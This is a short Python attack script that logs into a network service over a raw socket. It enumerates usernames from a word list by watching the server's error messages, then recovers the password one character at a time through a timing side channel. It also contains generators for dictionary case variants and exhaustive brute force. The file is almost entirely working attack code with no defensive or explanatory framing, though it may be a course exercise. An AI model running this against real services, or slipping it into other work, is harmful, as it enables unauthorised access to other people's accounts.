#!/usr/bin/env python3
import socket
import argparse
from itertools import product
import string
import json
import time

parser = argparse.ArgumentParser()
parser.add_argument('ip', nargs='?', help='Enter the ip to connect', default='.')
parser.add_argument('port', nargs='?', help='Enter the port number', default='.')
# parser.add_argument('message', nargs='?', help='Enter the message to send', default='.')
args = parser.parse_args()


def convert_to_string(tup):
    return ''.join(tup)


def password_generator():
    with open('passwords.txt') as file:
        passwords = [line.rstrip() for line in file]
    for password in passwords:
        for variation in product(*zip(password.upper(), password.lower())):
            yield convert_to_string(variation)


def brute_force():
    pass_string = string.ascii_lowercase + string.digits
    for i in range(1, 10):
        for p in product(pass_string, repeat=i):
            yield convert_to_string(p)


def connect(ip, port, message=None):
    with socket.socket() as client_socket:
        hostname = str(ip)
        port_num = int(port)
        address = (hostname, port_num)
        client_socket.connect(address)
        logins = {'login': None, 'password': ' '}
        with open('logins.txt') as f:
            users = [line.rstrip() for line in f]
        for user in users:
            logins['login'] = user
            data = json.dumps(logins).encode()
            client_socket.send(data)
            response = client_socket.recv(1024).decode()
            if 'Wrong password' in response:
                break
        characters = string.ascii_letters + string.digits
        logins['password'] = ''
        while True:
            for c in characters:
                logins['password'] += c
                data = json.dumps(logins).encode()
                t0 = time.time()
                client_socket.send(data)
                response = client_socket.recv(1024).decode()
                t1 = time.time() - t0
                if t1 > 0.01:
                    break
                elif 'password' in response:
                    logins['password'] = logins['password'][:-1]
                elif 'Connection success!' in response:
                    return json.dumps(logins, indent=4)


print(connect(args.ip, args.port))
